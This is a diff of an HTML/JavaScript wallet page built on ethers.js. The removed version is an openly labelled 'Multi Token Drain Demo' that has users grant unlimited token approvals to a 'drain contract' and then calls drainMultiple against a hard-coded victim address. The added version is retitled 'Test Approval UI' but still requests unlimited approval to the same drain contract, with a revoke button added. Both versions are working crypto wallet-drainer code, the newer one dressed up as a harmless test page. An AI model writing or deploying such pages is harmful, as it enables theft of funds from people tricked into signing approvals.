@@ -1,136 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Multi Token Drain Demo</title>
+  <title>Test Approval UI</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: sans-serif; }
+    button { padding: 8px 12px; margin: 5px; cursor: pointer; }
+  </style>
 </head>
 
-<body style="font-family:sans-serif">
+<body>
 
-<h2>Demo: Connect → Approve → Drain Multiple</h2>
+<h2>🧪 Test: Unlimited Approval (Manual)</h2>
 
-<button onclick="connect()">Connect Wallet</button><br><br>
+<button onclick="connect()">Connect Wallet</button>
 
-<button onclick="approveTokenA()">Approve Token A</button><br><br>
-<button onclick="approveTokenB()">Approve Token B</button><br><br>
+<p><b>Wallet:</b> <span id="addr">-</span></p>
 
-<button onclick="drainAll()">💣 Drain All Tokens</button>
+<hr>
+
+<h3>Token A</h3>
+<button onclick="approveMax(tokenA)">Approve Unlimited</button>
+<button onclick="revoke(tokenA)">Revoke</button>
+
+<h3>Token B</h3>
+<button onclick="approveMax(tokenB)">Approve Unlimited</button>
+<button onclick="revoke(tokenB)">Revoke</button>
 
 <script>
-let provider, signer, userAddress;
+let provider, signer, user;
 
-// 🔁 TOKEN ADDRESSES
+// ✅ YOUR TOKENS
 const tokenA = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 const tokenB = "0x48e8484f7D30305A6Cb442fd4c780E0BaD366b76";
 
-// 🔁 DRAIN CONTRACT
-const drainAddress = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";
+// ✅ YOUR DRAIN CONTRACT
+const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";
 
-// 🔁 VICTIM
-const victimAddress = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
-
-const tokenABI = [
-  "function approve(address spender, uint256 amount) public returns (bool)"
+const ABI = [
+  "function approve(address spender, uint256 amount) returns (bool)"
 ];
 
-const drainABI = [
-  "function drainMultiple(address[] memory tokens, address victim) public"
-];
-
-// CONNECT
 async function connect() {
-  try {
-    if (!window.ethereum) {
-      alert("Open inside Trust Wallet browser");
-      return;
-    }
-
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-
-    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-    signer = provider.getSigner();
-
-    await provider.getNetwork();
-
-    userAddress = await signer.getAddress();
-
-    alert("✅ Connected: " + userAddress);
-
-  } catch (e) {
-    alert("❌ Connect error: " + e.message);
+  if (!window.ethereum) {
+    alert("Open inside wallet browser");
+    return;
   }
+
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+
+  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+  signer = provider.getSigner();
+  user = await signer.getAddress();
+
+  document.getElementById("addr").innerText = user;
 }
 
-// APPROVE TOKEN A
-async function approveTokenA() {
+// 🔥 Unlimited approval (explicit click)
+async function approveMax(tokenAddr) {
   try {
-    if (!signer) {
-      alert("Connect wallet first");
-      return;
-    }
+    const token = new ethers.Contract(tokenAddr, ABI, signer);
 
-    const contract = new ethers.Contract(tokenA, tokenABI, signer);
-
-    const tx = await contract.approve(
-      drainAddress,
+    const tx = await token.approve(
+      spender,
       ethers.constants.MaxUint256
     );
 
     await tx.wait();
 
-    alert("✅ Token A Approved");
+    alert("✅ Unlimited approval granted");
 
   } catch (e) {
-    alert("❌ Error: " + e.message);
+    alert(e.message);
   }
 }
 
-// APPROVE TOKEN B
-async function approveTokenB() {
+// 🔐 Revoke
+async function revoke(tokenAddr) {
   try {
-    if (!signer) {
-      alert("Connect wallet first");
-      return;
-    }
+    const token = new ethers.Contract(tokenAddr, ABI, signer);
 
-    const contract = new ethers.Contract(tokenB, tokenABI, signer);
-
-    const tx = await contract.approve(
-      drainAddress,
-      ethers.constants.MaxUint256
-    );
-
+    const tx = await token.approve(spender, 0);
     await tx.wait();
 
-    alert("✅ Token B Approved");
+    alert("🔐 Approval revoked");
 
   } catch (e) {
-    alert("❌ Error: " + e.message);
-  }
-}
-
-// DRAIN ALL
-async function drainAll() {
-  try {
-    if (!signer) {
-      alert("Connect wallet first");
-      return;
-    }
-
-    await provider.getNetwork();
-
-    const contract = new ethers.Contract(drainAddress, drainABI, signer);
-
-    const tokens = [tokenA, tokenB];
-
-    const tx = await contract.drainMultiple(tokens, victimAddress);
-
-    await tx.wait();
-
-    alert("💣 All tokens drained");
-
-  } catch (e) {
-    alert("❌ Drain error: " + e.message);
+    alert(e.message);
   }
 }
 </script>
